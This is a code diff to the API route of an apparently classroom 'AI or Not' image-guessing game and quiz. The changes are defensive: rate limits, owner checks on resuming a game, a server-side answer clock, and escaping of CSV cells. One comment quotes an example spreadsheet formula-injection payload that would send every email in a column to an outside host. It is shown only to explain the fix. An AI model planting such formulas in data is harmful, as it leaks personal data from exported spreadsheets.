@@ -1,9 +1,9 @@
 import { NextResponse, type NextRequest } from "next/server";
 import { timingSafeEqual } from "node:crypto";
-import { POOL, byId, drawGame, imageUrl } from "@/lib/sagarmatha/images";
+import { pool, poolStatus, byId, drawGame, imageUrl } from "@/lib/sagarmatha/images";
 import { QUIZZES, publicQuiz } from "@/lib/sagarmatha/quiz";
 import {
-  SESSION, storageMode, createGame, findGameByEmail, getGame, updateGame, listGames, saveQuiz, listQuiz,
+  SESSION, storageMode, checkDb, createGame, findGameByEmail, getGame, updateGame, startClock, listGames, listGamesPublic, saveQuiz, listQuiz, listQuizAnswers,
   type Answer, type Game,
 } from "@/lib/sagarmatha/store";
 
@@ -18,7 +18,9 @@ import {
  */
 
 const SECONDS = 10;
-const GRACE_MS = 1500; // network + tap latency before a late answer counts as a timeout
+// The clock starts when the server hands out the image URL, so allow for the
+// image download plus network and tap latency before an answer counts as late.
+const GRACE_MS = 3000;
 
 // A whole class shares one college IP, so the limit is per IP but generous.
 const hits = new Map<string, number[]>();
@@ -45,11 +47,15 @@ function isAdmin(req: NextRequest) {
   return a.length === b.length && timingSafeEqual(a, b);
 }
 
-function publicImages(g: Game) {
-  return g.image_ids.map((id, n) => {
-    const img = byId(id);
-    return { n, url: img ? imageUrl(img) : null };
-  });
+const quizById = (id: string) => (Object.hasOwn(QUIZZES, id) ? QUIZZES[id] : undefined);
+const ipOf = (req: NextRequest) => (req.headers.get("x-forwarded-for") ?? "local").split(",")[0].trim();
+
+let boardCache: { at: number; data: Awaited<ReturnType<typeof buildLeaderboard>> } | null = null;
+async function leaderboard() {
+  if (boardCache && Date.now() - boardCache.at < 2000) return boardCache.data;
+  const data = await buildLeaderboard();
+  boardCache = { at: Date.now(), data };
+  return data;
 }
 
 function summary(g: Game) {
@@ -70,8 +76,8 @@ function reveal(g: Game) {
   });
 }
 
-async function leaderboard() {
-  const games = (await listGames()).filter((g) => g.answers.length > 0);
+async function buildLeaderboard() {
+  const games = (await listGamesPublic()).filter((g) => g.answers.length > 0);
   games.sort((a, b) => b.points - a.points || a.total_ms - b.total_ms || a.created_at.localeCompare(b.created_at));
   const finished = games.filter((g) => g.finished);
   return {
@@ -95,10 +101,14 @@ async function leaderboard() {
 
 function csv(rows: Record<string, unknown>[]) {
   if (!rows.length) return "";
-  const cols = Object.keys(rows[0]);
+  // Every column any row has (quiz rows can skip questions).
+  const cols = [...new Set(rows.flatMap((r) => Object.keys(r)))];
   const esc = (v: unknown) => {
-    const s = v == null ? "" : typeof v === "object" ? JSON.stringify(v) : String(v);
-    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+    let s = v == null ? "" : typeof v === "object" ? JSON.stringify(v) : String(v);
+    // A name like =IMAGE("https://x/"&D:D) would run as a formula in Sheets or
+    // Excel and could send every email away. Prefix so it stays plain text.
+    if (typeof v === "string" && /^[=+\-@\t\r]/.test(s)) s = "'" + s;
+    return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
   };
   return [cols.join(","), ...rows.map((r) => cols.map((c) => esc(r[c])).join(","))].join("\n");
 }
@@ -107,7 +117,14 @@ type Ctx = { params: Promise<{ path: string[] }> };
 
 export async function GET(req: NextRequest, ctx: Ctx) {
   const route = (await ctx.params).path.join("/");
-  if (route === "config") return json({ storage: storageMode, session: SESSION, poolSize: POOL.length });
+  if (limited(ipOf(req), 1500)) return json({ error: "slow_down" }, 429);
+  if (route === "config") return json({ storage: storageMode, db: await checkDb(), pool: poolStatus(), poolSize: pool().length, session: SESSION });
+
+  // Questions are static: they load even if storage is down.
+  if (route === "quiz/questions") {
+    const q = publicQuiz(req.nextUrl.searchParams.get("quiz") ?? "final");
+    return q ? json(q) : json({ error: "not_found" }, 404);
+  }
   if (storageMode === "none") return json({ error: "storage_not_configured" }, 503);
 
   try {
@@ -120,16 +137,11 @@ export async function GET(req: NextRequest, ctx: Ctx) {
       return json({ summary: summary(g), reveal: reveal(g) });
     }
 
-    if (route === "quiz/questions") {
-      const q = publicQuiz(req.nextUrl.searchParams.get("quiz") ?? "final");
-      return q ? json(q) : json({ error: "not_found" }, 404);
-    }
-
     if (route === "quiz/stats") {
       const id = req.nextUrl.searchParams.get("quiz") ?? "final";
-      const qz = QUIZZES[id];
+      const qz = quizById(id);
       if (!qz) return json({ error: "not_found" }, 404);
-      const rows = await listQuiz(id);
+      const rows = await listQuizAnswers(id);
       return json({
         responses: rows.length,
         questions: qz.questions.map((q) => {
@@ -141,7 +153,10 @@ export async function GET(req: NextRequest, ctx: Ctx) {
     }
 
     if (route === "admin/export") {
-      if (!isAdmin(req)) return json({ error: "unauthorized" }, 401);
+      if (!isAdmin(req)) {
+        if (limited("admin:" + ipOf(req), 20)) return json({ error: "slow_down" }, 429);
+        return json({ error: "unauthorized" }, 401);
+      }
       const type = req.nextUrl.searchParams.get("type") ?? "aion";
       const format = req.nextUrl.searchParams.get("format") ?? "json";
       let rows: Record<string, unknown>[];
@@ -179,8 +194,7 @@ export async function GET(req: NextRequest, ctx: Ctx) {
 export async function POST(req: NextRequest, ctx: Ctx) {
   const route = (await ctx.params).path.join("/");
   if (storageMode === "none") return json({ error: "storage_not_configured" }, 503);
-  const ip = (req.headers.get("x-forwarded-for") ?? "local").split(",")[0].trim();
-  if (limited(ip)) return json({ error: "slow_down" }, 429);
+  if (limited(ipOf(req))) return json({ error: "slow_down" }, 429);
 
   let body: Record<string, unknown> = {};
   try { body = await req.json(); } catch { return json({ error: "bad_json" }, 400); }
@@ -194,30 +208,38 @@ export async function POST(req: NextRequest, ctx: Ctx) {
       if (name.length < 2) return json({ error: "name_required" }, 400);
       if (!EMAIL.test(email)) return json({ error: "email_invalid" }, 400);
 
+      // Only the phone that started a game can resume it or see its result, so
+      // knowing a classmate's email isn't enough to take over their game.
+      const mine = clean(body.gameId, 40);
       const existing = await findGameByEmail(email);
       if (existing) {
-        if (existing.finished) return json({ error: "already_played", gameId: existing.id }, 409);
-        return json({ gameId: existing.id, index: existing.current_index, images: publicImages(existing), seconds: SECONDS, resumed: true });
+        const owner = mine === existing.id;
+        if (existing.finished) return json({ error: "already_played", ...(owner ? { gameId: existing.id } : {}) }, 409);
+        if (!owner) return json({ error: "already_started" }, 409);
+        return json({ gameId: existing.id, index: existing.current_index, total: existing.image_ids.length, seconds: SECONDS, resumed: true });
       }
       // Not playable until both kinds exist; otherwise "always Real" scores 100%.
-      const kinds = { ai: POOL.filter((p) => p.truth === "ai").length, real: POOL.filter((p) => p.truth === "real").length };
+      const all = pool();
+      const kinds = { ai: all.filter((p) => p.truth === "ai").length, real: all.filter((p) => p.truth === "real").length };
       if (kinds.ai < 3 || kinds.real < 3) return json({ error: "pool_empty" }, 503);
       const picked = drawGame(10);
       const g = await createGame({ name, email, roll, image_ids: picked.map((p) => p.id) });
-      if (g === "exists") {
-        const again = await findGameByEmail(email);
-        return again ? json({ gameId: again.id, index: again.current_index, images: publicImages(again), seconds: SECONDS, resumed: true }) : json({ error: "server_error" }, 500);
-      }
-      return json({ gameId: g.id, index: 0, images: publicImages(g), seconds: SECONDS, resumed: false });
+      if (g === "exists") return json({ error: "already_started" }, 409); // two taps at once
+      return json({ gameId: g.id, index: 0, total: g.image_ids.length, seconds: SECONDS, resumed: false });
     }
 
-    /* -------- AI or Not: image is now on screen; start its clock -------- */
+    /* -------- AI or Not: hand out ONE image and start its clock --------
+     * The URL is only revealed here, and the clock starts now, once. Calling
+     * again (reload) returns the same image with the time already used. */
     if (route === "aion/show") {
-      const g = await getGame(clean(body.gameId, 40));
+      const g0 = await getGame(clean(body.gameId, 40));
       const index = Number(body.index);
-      if (!g || g.finished || index !== g.current_index) return json({ error: "bad_state", index: g?.current_index }, 409);
-      await updateGame(g.id, index, { shown_at: new Date().toISOString() });
-      return json({ ok: true, seconds: SECONDS });
+      if (!g0 || g0.finished || index !== g0.current_index) return json({ error: "bad_state", index: g0?.current_index, finished: g0?.finished }, 409);
+      const g = await startClock(g0.id, index);
+      const img = g ? byId(g.image_ids[index]) : undefined;
+      if (!g || !img || !g.shown_at) return json({ error: "bad_state", index: g?.current_index }, 409);
+      const used = Date.now() - new Date(g.shown_at).getTime();
+      return json({ url: imageUrl(img), n: index, total: g.image_ids.length, seconds: SECONDS, remainingMs: Math.max(0, SECONDS * 1000 - used) });
     }
 
     /* -------- AI or Not: answer the current image -------- */
@@ -230,10 +252,11 @@ export async function POST(req: NextRequest, ctx: Ctx) {
       const img = byId(g.image_ids[index]);
       if (!img) return json({ error: "server_error" }, 500);
       const guess = body.guess === "ai" || body.guess === "real" ? body.guess : null;
-      const elapsed = g.shown_at ? Date.now() - new Date(g.shown_at).getTime() : SECONDS * 1000;
+      // Never shown by the server = never on screen = no points.
+      const elapsed = g.shown_at ? Date.now() - new Date(g.shown_at).getTime() : Infinity;
       const timedOut = guess === null || elapsed > SECONDS * 1000 + GRACE_MS;
       const correct = !timedOut && guess === img.truth;
-      const ms = Math.min(elapsed, SECONDS * 1000);
+      const ms = Math.min(Math.max(0, elapsed - 500), SECONDS * 1000);
       const points = correct ? 100 + Math.round(50 * Math.max(0, (SECONDS * 1000 - ms) / (SECONDS * 1000))) : 0;
 
       const answer: Answer = { imageId: img.id, guess: timedOut ? null : guess, correct, ms, points };
@@ -265,7 +288,7 @@ export async function POST(req: NextRequest, ctx: Ctx) {
     /* -------- Quiz: submit all answers at once -------- */
     if (route === "quiz/submit") {
       const quizId = clean(body.quiz, 20) || "final";
-      const qz = QUIZZES[quizId];
+      const qz = quizById(quizId);
       if (!qz) return json({ error: "not_found" }, 404);
       const name = clean(body.name, 60);
       const email = clean(body.email, 120).toLowerCase();
